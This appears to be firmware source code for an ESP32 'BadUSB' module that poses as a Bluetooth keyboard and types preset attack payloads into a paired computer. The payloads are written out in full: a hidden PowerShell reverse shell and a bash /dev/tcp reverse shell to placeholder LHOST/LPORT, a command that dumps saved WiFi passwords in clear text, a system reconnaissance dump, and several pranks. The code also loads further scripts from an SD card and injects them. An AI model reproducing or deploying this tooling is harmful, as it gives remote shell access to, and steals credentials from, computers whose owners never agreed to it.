// ═══════════════════════════════════════════════════════════════════════════
// EVAWARE BadUSB Module Implementation
// BLE HID keystroke injection — 10 premade payloads, own dedicated UI screen
// Created: 2026-08-20
//
// PLAIN-ENGLISH OVERVIEW
// Same trick as BLE Ducky: the board pairs as a Bluetooth keyboard, and once
// a computer accepts the pairing, this module "types" a pre-written script
// into it at machine speed. The 10 payloads below are the same well-known
// demo categories every USB Rubber Ducky / BadUSB writeup covers (reverse
// shell, recon dump, wifi profile export, prank message, custom text, etc.)
// — kept as safe local demo shapes (placeholder LHOST/LPORT, no real
// third-party targets baked in) matching the existing BLE Ducky module.
// ═══════════════════════════════════════════════════════════════════════════

#include "badusb_attacks.h"
#include "shared.h"
#include "touch_buttons.h"
#include "utils.h"
#include "icon.h"
#include "nosifer_font.h"
#include <TFT_eSPI.h>
#include <BLEDevice.h>
#include <BleKeyboard.h>
#include "esp_bt.h"
#include "esp_wifi.h"
#include <WiFi.h>
#include <SPI.h>
#include <SD.h>

extern TFT_eSPI tft;

namespace BadUSB {

// ── Payload definitions ───────────────────────────────────────────────────
enum BuPayloadType {
    BU_REVSHELL_PS = 0,     // PowerShell reverse shell (Win+R)
    BU_REVSHELL_BASH,       // Bash reverse shell (Ctrl+Alt+T)
    BU_WIFI_DUMP,           // Dump saved WiFi profiles + keys to a text file
    BU_SYSTEM_RECON,        // systeminfo/whoami/ipconfig dump to a text file
    BU_OPEN_CMD,            // Open an elevated-looking Command Prompt
    BU_NOTEPAD_MSG,         // Open Notepad and type a message
    BU_MINIMIZE_ALL,        // Win+D prank — minimizes every window
    BU_LOCKSCREEN_SPAM,     // Rapid Enter presses at a lock screen
    BU_RICKROLL,            // Opens a browser to a well-known link (classic demo)
    BU_CUSTOM_STRING,       // User-defined text
    BU_PAYLOAD_COUNT        // 10
};

static const char* const BU_PAYLOAD_NAMES[] = {
    "RevShell PS",
    "RevShell Bash",
    "WiFi Pass Dump",
    "System Recon",
    "Open CMD",
    "Notepad Msg",
    "Minimize All",
    "Lock Spam",
    "Rick Roll",
    "Custom Text"
};

// Payload strings (PROGMEM) — placeholder LHOST/LPORT, same convention as BLE Ducky
static const char BU_PS_REVSHELL[] PROGMEM =
    "powershell -NoP -W Hidden -Exec Bypass -C "
    "\"$c=New-Object Net.Sockets.TCPClient('LHOST',LPORT);"
    "$s=$c.GetStream();[byte[]]$b=0..65535|%{0};"
    "while(($i=$s.Read($b,0,$b.Length))-ne 0){"
    "$d=(New-Object Text.ASCIIEncoding).GetString($b,0,$i);"
    "$r=(iex $d 2>&1|Out-String);"
    "$t=[text.encoding]::ASCII.GetBytes($r);"
    "$s.Write($t,0,$t.Length)}\"\n";

static const char BU_BASH_REVSHELL[] PROGMEM =
    "bash -i >& /dev/tcp/LHOST/LPORT 0>&1\n";

static const char BU_WIFI_DUMP_CMD[] PROGMEM =
    "powershell -NoP -W Hidden -C \"netsh wlan show profiles | "
    "Select-String 'All User Profile' | ForEach-Object{ $n=($_ -split ':')[1].Trim(); "
    "netsh wlan show profile name=\\\"$n\\\" key=clear } "
    "> \\\"$env:USERPROFILE\\Desktop\\wifi_dump.txt\\\"\"\n";

static const char BU_RECON_CMD[] PROGMEM =
    "cmd /c \"(systeminfo & whoami /all & ipconfig /all) "
    "> %USERPROFILE%\\Desktop\\recon_dump.txt\"\n";

static const char BU_NOTEPAD_TEXT[] PROGMEM =
    "This device was left unlocked. Physical access = full access.\n"
    "-- left by EVAWARE BadUSB (authorized test) --\n";

static const char BU_RICKROLL_URL[] PROGMEM =
    "https://www.youtube.com/watch?v=dQw4w9WgXcQ\n";

// ── State ─────────────────────────────────────────────────────────────────
struct BuState {
    int     selectedPayload;
    bool    injecting;
    bool    connected;
    int     keystrokesTotal;
    int     keystrokesSent;
    char    customString[256];
    int     customLen;
};

static BuState* bu = nullptr;
static BleKeyboard* bleKb = nullptr;
static bool buExitRequested = false;
static unsigned long buLastDisplay = 0;
static bool buBleInitialized = false;
static bool buDirty = true;

#define BU_SD_DIR "/badusb"
#define BU_MAX_SD_FILES 12
static char buSdFiles[BU_MAX_SD_FILES][32];
static int buSdFileCount = 0;
static int buSdFileIndex = 0;
static bool buSdReady = false;
static char buLoadStatus[56] = "";

// ── Icon bar ──────────────────────────────────────────────────────────────
#define BU_ICON_NUM 4
static const int buIconX[BU_ICON_NUM] = {10, SCALE_X(70), SCALE_X(105), SCALE_X(140)};
static const unsigned char* const buIcons[BU_ICON_NUM] = {
    bitmap_icon_go_back,
    bitmap_icon_start,
    bitmap_icon_LEFT,
    bitmap_icon_RIGHT
};

static void drawBuIconBar() {
    tft.drawLine(0, ICON_BAR_TOP, SCREEN_WIDTH, ICON_BAR_TOP, HALEHOUND_MAGENTA);
    tft.fillRect(0, ICON_BAR_Y, SCREEN_WIDTH, ICON_BAR_H, HALEHOUND_GUNMETAL);
    for (int i = 0; i < BU_ICON_NUM; i++) {
        tft.drawBitmap(buIconX[i], ICON_BAR_Y, buIcons[i], 16, 16, HALEHOUND_MAGENTA);
    }
    tft.drawLine(0, ICON_BAR_BOTTOM, SCREEN_WIDTH, ICON_BAR_BOTTOM, HALEHOUND_HOTPINK);
}

static void setLoadStatus(const char* msg) {
    strncpy(buLoadStatus, msg, sizeof(buLoadStatus) - 1);
    buLoadStatus[sizeof(buLoadStatus) - 1] = '\0';
}

static bool isAllowedScriptExt(const String& filename) {
    String lower = filename;
    lower.toLowerCase();
    return lower.endsWith(".txt") || lower.endsWith(".ducky") || lower.endsWith(".ps1") ||
           lower.endsWith(".cmd") || lower.endsWith(".sh");
}

static bool scanSdScripts() {
    buSdFileCount = 0;

    File dir = SD.open(BU_SD_DIR);
    if (!dir || !dir.isDirectory()) {
        if (dir) dir.close();
        setLoadStatus("Missing /badusb directory");
        return false;
    }

    File entry = dir.openNextFile();
    while (entry && buSdFileCount < BU_MAX_SD_FILES) {
        if (!entry.isDirectory()) {
            String name = String(entry.name());
            int slash = name.lastIndexOf('/');
            if (slash >= 0) name = name.substring(slash + 1);

            if (name.length() > 0 && isAllowedScriptExt(name)) {
                strncpy(buSdFiles[buSdFileCount], name.c_str(), sizeof(buSdFiles[buSdFileCount]) - 1);
                buSdFiles[buSdFileCount][sizeof(buSdFiles[buSdFileCount]) - 1] = '\0';
                buSdFileCount++;
            }
        }
        entry.close();
        entry = dir.openNextFile();
    }
    dir.close();

    if (buSdFileCount <= 0) {
        buSdFileIndex = 0;
        setLoadStatus("No scripts in /badusb");
        return false;
    }

    if (buSdFileIndex >= buSdFileCount) buSdFileIndex = 0;
    return true;
}

static bool ensureSdAndScripts() {
    if (!buSdReady) {
        buSdReady = SD.begin(SD_CS);
        if (!buSdReady) {
            buSdReady = SD.begin(SD_CS, SPI, 4000000);
        }
        if (!buSdReady) {
            setLoadStatus("SD mount failed");
            return false;
        }
    }

    return scanSdScripts();
}

static bool loadSelectedScriptFromSd() {
    if (!bu) return false;
    if (!ensureSdAndScripts()) return false;

    if (buSdFileIndex < 0 || buSdFileIndex >= buSdFileCount) {
        setLoadStatus("No script selected");
        return false;
    }

    String path = String(BU_SD_DIR) + "/" + buSdFiles[buSdFileIndex];
    File f = SD.open(path.c_str(), FILE_READ);
    if (!f) {
        setLoadStatus("Open failed");
        return false;
    }

    size_t idx = 0;
    while (f.available() && idx < sizeof(bu->customString) - 1) {
        char c = (char)f.read();
        if (c == '\r') continue;
        bu->customString[idx++] = c;
    }
    bool truncated = f.available();
    f.close();

    bu->customString[idx] = '\0';
    bu->customLen = (int)idx;
    bu->selectedPayload = BU_CUSTOM_STRING;

    if (idx == 0) {
        setLoadStatus("Loaded empty script");
    } else if (truncated) {
        setLoadStatus("Loaded (truncated to 255)");
    } else {
        setLoadStatus("Script loaded from SD");
    }

    return true;
}

// ── Inject the selected payload via BLE keyboard ───────────────────────────
static void injectPayload() {
    if (!bu || !bleKb || !bleKb->isConnected()) return;

    char payloadBuf[400];
    const char* payload = nullptr;

    switch (bu->selectedPayload) {
        case BU_REVSHELL_PS:
            bleKb->press(KEY_LEFT_GUI);
            bleKb->press('r');
            delay(30);
            bleKb->release('r');
            delay(10);
            bleKb->release(KEY_LEFT_GUI);
            delay(700);
            strncpy_P(payloadBuf, BU_PS_REVSHELL, sizeof(payloadBuf) - 1);
            payloadBuf[sizeof(payloadBuf) - 1] = '\0';
            payload = payloadBuf;
            break;

        case BU_REVSHELL_BASH:
            bleKb->press(KEY_LEFT_CTRL);
            bleKb->press(KEY_LEFT_ALT);
            bleKb->press('t');
            delay(30);
            bleKb->release('t');
            delay(10);
            bleKb->release(KEY_LEFT_ALT);
            bleKb->release(KEY_LEFT_CTRL);
            delay(900);
            strncpy_P(payloadBuf, BU_BASH_REVSHELL, sizeof(payloadBuf) - 1);
            payloadBuf[sizeof(payloadBuf) - 1] = '\0';
            payload = payloadBuf;
            break;

        case BU_WIFI_DUMP:
            bleKb->press(KEY_LEFT_GUI);
            bleKb->press('r');
            delay(30);
            bleKb->release('r');
            delay(10);
            bleKb->release(KEY_LEFT_GUI);
            delay(700);
            strncpy_P(payloadBuf, BU_WIFI_DUMP_CMD, sizeof(payloadBuf) - 1);
            payloadBuf[sizeof(payloadBuf) - 1] = '\0';
            payload = payloadBuf;
            break;

        case BU_SYSTEM_RECON:
            bleKb->press(KEY_LEFT_GUI);
            bleKb->press('r');
            delay(30);
            bleKb->release('r');
            delay(10);
            bleKb->release(KEY_LEFT_GUI);
            delay(700);
            strncpy_P(payloadBuf, BU_RECON_CMD, sizeof(payloadBuf) - 1);
            payloadBuf[sizeof(payloadBuf) - 1] = '\0';
            payload = payloadBuf;
            break;

        case BU_OPEN_CMD:
            bleKb->press(KEY_LEFT_GUI);
            bleKb->press('r');
            delay(30);
            bleKb->release('r');
            delay(10);
            bleKb->release(KEY_LEFT_GUI);
            delay(700);
            payload = "cmd\n";
            break;

        case BU_NOTEPAD_MSG:
            bleKb->press(KEY_LEFT_GUI);
            bleKb->press('r');
            delay(30);
            bleKb->release('r');
            delay(10);
            bleKb->release(KEY_LEFT_GUI);
            delay(700);
            bleKb->print("notepad\n");
            delay(800);
            strncpy_P(payloadBuf, BU_NOTEPAD_TEXT, sizeof(payloadBuf) - 1);
            payloadBuf[sizeof(payloadBuf) - 1] = '\0';
            payload = payloadBuf;
            break;

        case BU_MINIMIZE_ALL:
            bu->keystrokesTotal = 1;
            bleKb->press(KEY_LEFT_GUI);
            bleKb->press('d');
            delay(30);
            bleKb->release('d');
            bleKb->release(KEY_LEFT_GUI);
            bu->keystrokesSent = 1;
            return;

        case BU_LOCKSCREEN_SPAM:
            bu->keystrokesTotal = 10;
            for (int i = 0; i < 10 && bu->injecting; i++) {
                bleKb->write(KEY_RETURN);
                delay(200);
                bu->keystrokesSent = i + 1;
            }
            return;

        case BU_RICKROLL:
            bleKb->press(KEY_LEFT_GUI);
            bleKb->press('r');
            delay(30);
            bleKb->release('r');
            delay(10);
            bleKb->release(KEY_LEFT_GUI);
            delay(700);
            strncpy_P(payloadBuf, BU_RICKROLL_URL, sizeof(payloadBuf) - 1);
            payloadBuf[sizeof(payloadBuf) - 1] = '\0';
            payload = payloadBuf;
            break;

        case BU_CUSTOM_STRING:
            payload = bu->customString;
            break;

        default:
            return;
    }

    if (!payload) return;

    bu->keystrokesTotal = strlen(payload);
    bu->keystrokesSent = 0;
    for (size_t i = 0; i < strlen(payload) && bu->injecting; i++) {
        bleKb->write(payload[i]);
        bu->keystrokesSent = i + 1;
        delay(8);
    }
    bu->injecting = false;
}

// ── Draw the screen ─────────────────────────────────────────────────────
static void drawBuDisplay() {
    tft.fillScreen(HALEHOUND_BLACK);
    drawStatusBar();
    drawGlitchText(SCALE_Y(55), "BADUSB", &Nosifer_Regular10pt7b);
    drawBuIconBar();

    int y = SCALE_Y(75);
    tft.setTextColor(bu->connected ? HALEHOUND_GREEN : HALEHOUND_GUNMETAL, HALEHOUND_BLACK);
    tft.setCursor(10, y);
    tft.print(bu->connected ? "PAIRED" : "WAITING FOR PAIRING...");
    y += 14;

    tft.drawLine(10, y, SCREEN_WIDTH - 10, y, HALEHOUND_HOTPINK);
    y += 6;

    tft.setTextColor(HALEHOUND_HOTPINK, HALEHOUND_BLACK);
    tft.setCursor(10, y);
    tft.print("SD SCRIPTS  /badusb");
    y += 12;

    if (buSdFileCount == 0) {
        tft.setCursor(20, y);
        tft.setTextColor(HALEHOUND_GUNMETAL, HALEHOUND_BLACK);
        tft.print("No scripts found");
    } else {
        for (int i = 0; i < buSdFileCount; i++) {
            tft.setCursor(16, y);
            tft.setTextColor(i == buSdFileIndex ? HALEHOUND_BRIGHT : HALEHOUND_GUNMETAL,
                             HALEHOUND_BLACK);
            tft.print(i == buSdFileIndex ? "> " : "  ");
            tft.print(buSdFiles[i]);
            y += 12;
        }
    }

    y += 4;
    tft.drawLine(10, y, SCREEN_WIDTH - 10, y, HALEHOUND_HOTPINK);
    y += 6;

    if (bu->injecting) {
        tft.setTextColor(HALEHOUND_HOTPINK, HALEHOUND_BLACK);
        tft.setCursor(10, y);
        tft.print("INJECTING...");
        y += 14;

        int barX = 10;
        int barW = SCREEN_WIDTH - 20;
        int barH = SCALE_H(14);
        tft.drawRect(barX, y, barW, barH, HALEHOUND_MAGENTA);
        int progress = 0;
        if (bu->keystrokesTotal > 0) {
            progress = (bu->keystrokesSent * (barW - 2)) / bu->keystrokesTotal;
        }
        tft.fillRect(barX + 1, y + 1, progress, barH - 2, HALEHOUND_HOTPINK);
        y += barH + 6;

        tft.setTextColor(HALEHOUND_MAGENTA, HALEHOUND_BLACK);
        tft.setCursor(10, y);
        tft.printf("SENT: %d/%d", bu->keystrokesSent, bu->keystrokesTotal);
    } else if (bu->keystrokesSent > 0) {
        tft.setTextColor(HALEHOUND_BRIGHT, HALEHOUND_BLACK);
        tft.setCursor(10, y);
        tft.print("INJECTION COMPLETE");
        y += 14;
        tft.setTextColor(HALEHOUND_MAGENTA, HALEHOUND_BLACK);
        tft.setCursor(10, y);
        tft.printf("SENT: %d keystrokes", bu->keystrokesSent);
    } else if (!bu->connected) {
        tft.setTextColor(HALEHOUND_GUNMETAL, HALEHOUND_BLACK);
        tft.setCursor(10, y);
        tft.print("Pair a device to begin");
    } else {
        tft.setTextColor(HALEHOUND_GUNMETAL, HALEHOUND_BLACK);
        tft.setCursor(10, y);
        tft.print("READY - Press START to inject");
    }
}

// ── Setup ─────────────────────────────────────────────────────────────────
void setup() {
    buExitRequested = false;
    buLastDisplay = 0;
    buBleInitialized = false;
    buDirty = true;
    buSdReady = false;
    buSdFileCount = 0;
    buSdFileIndex = 0;
    buLoadStatus[0] = '\0';

    if (bu) { free(bu); bu = nullptr; }
    bu = (BuState*)calloc(1, sizeof(BuState));
    if (!bu) {
        tft.fillScreen(TFT_BLACK);
        drawCenteredText(120, "HEAP ALLOC FAILED", HALEHOUND_HOTPINK, 2);
        return;
    }
    bu->selectedPayload = BU_RICKROLL;

    tft.fillScreen(HALEHOUND_BLACK);
    drawStatusBar();
    drawGlitchText(SCALE_Y(55), "BADUSB", &Nosifer_Regular10pt7b);
    drawBuIconBar();

    esp_wifi_stop();
    delay(100);

    if (bleKb) { delete bleKb; bleKb = nullptr; }
    bleKb = new BleKeyboard("EVAWARE BadUSB", "EVAWARE", 100);
    bleKb->begin();
    delay(150);

    esp_ble_tx_power_set(ESP_BLE_PWR_TYPE_DEFAULT, ESP_PWR_LVL_P9);
    esp_ble_tx_power_set(ESP_BLE_PWR_TYPE_ADV, ESP_PWR_LVL_P9);

    if (ensureSdAndScripts()) {
        bu->selectedPayload = BU_CUSTOM_STRING;
        loadSelectedScriptFromSd();
    }

    buBleInitialized = true;
    drawBuDisplay();

    #if CYD_DEBUG
    Serial.println("[BADUSB] Setup complete, advertising as 'EVAWARE BadUSB'");
    Serial.printf("[BADUSB] Free heap: %u\n", ESP.getFreeHeap());
    #endif
}

// ── Loop ──────────────────────────────────────────────────────────────────
void loop() {
    if (!bu || !bleKb) return;

    if (millis() - buLastDisplay >= 250) {
        bool wasConnected = bu->connected;
        bu->connected = bleKb->isConnected();
        if (bu->connected != wasConnected) {
            buDirty = true;
            #if CYD_DEBUG
            Serial.printf("[BADUSB] %s\n", bu->connected ? "DEVICE CONNECTED" : "DEVICE DISCONNECTED");
            #endif
        }
    }

    uint16_t tx, ty;
    if (getTouchPoint(&tx, &ty)) {
        if (ty >= ICON_BAR_TOUCH_TOP && ty <= ICON_BAR_TOUCH_BOTTOM) {
            // Back
            if (tx < 40) {
                buExitRequested = true;
                return;
            }
            // Inject / Stop
            if (tx >= buIconX[1] - 10 && tx < buIconX[1] + 25) {
                waitForTouchRelease();
                delay(200);
                if (bu->injecting) {
                    bu->injecting = false;
                } else if (bu->connected) {
                    if (bu->selectedPayload != BU_CUSTOM_STRING || bu->customLen == 0) {
                        if (!loadSelectedScriptFromSd() || bu->customLen == 0) {
                            buDirty = true;
                            return;
                        }
                    }
                    bu->injecting = true;
                    bu->keystrokesSent = 0;
                    bu->keystrokesTotal = 0;
                    buDirty = true;
                    drawBuDisplay();
                    injectPayload();
                }
                return;
            }
            // Previous SD script
            if (tx >= buIconX[2] - 10 && tx < buIconX[2] + 25) {
                waitForTouchRelease();
                delay(200);
                if (buSdFileCount > 0) {
                    buSdFileIndex = (buSdFileIndex - 1 + buSdFileCount) % buSdFileCount;
                    loadSelectedScriptFromSd();
                }
                buDirty = true;
                return;
            }
            // Next SD script
            if (tx >= buIconX[3] - 10 && tx < buIconX[3] + 25) {
                waitForTouchRelease();
                delay(200);
                if (buSdFileCount > 0) {
                    buSdFileIndex = (buSdFileIndex + 1) % buSdFileCount;
                    loadSelectedScriptFromSd();
                }
                buDirty = true;
                return;
            }
        }

        // Tap a file row to select and load it.
        int listY = SCALE_Y(75) + 14 + 6 + 12;
        if (tx >= 10 && tx <= SCREEN_WIDTH - 10 && ty >= listY - 2 &&
            ty < listY + (buSdFileCount * 12)) {
            int idx = (ty - listY) / 12;
            if (idx >= 0 && idx < buSdFileCount && idx != buSdFileIndex) {
                waitForTouchRelease();
                delay(150);
                buSdFileIndex = idx;
                loadSelectedScriptFromSd();
                buDirty = true;
                return;
            }
        }
    }

    if (buttonPressed(BTN_BACK) || buttonPressed(BTN_BOOT)) {
        buExitRequested = true;
        return;
    }

    if (buDirty && millis() - buLastDisplay >= 100) {
        drawBuDisplay();
        buLastDisplay = millis();
        buDirty = false;
    }
}

bool isExitRequested() {
    return buExitRequested;
}

void cleanup() {
    if (bu) bu->injecting = false;

    if (bleKb) {
        bleKb->end();
        delete bleKb;
        bleKb = nullptr;
    }

    if (buBleInitialized) {
        BLEDevice::deinit(false);
        buBleInitialized = false;
    }

    if (bu) { free(bu); bu = nullptr; }
    buExitRequested = false;

    #if CYD_DEBUG
    Serial.println("[BADUSB] Cleanup complete");
    #endif
}

}  // namespace BadUSB
